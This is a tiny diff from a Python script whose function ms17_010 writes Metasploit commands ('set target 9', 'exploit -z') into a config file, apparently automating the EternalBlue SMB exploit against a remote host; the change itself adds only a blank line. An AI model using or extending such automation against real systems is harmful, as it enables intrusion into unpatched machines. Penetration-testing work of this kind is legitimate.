@@ -46,6 +46,7 @@ def ms17_010(configFile,rhost,lhost):
     configFile.write('set target 9\n')
     configFile.write('exploit -z\n')
 
+    
 
 def attack_module_2():
     pass
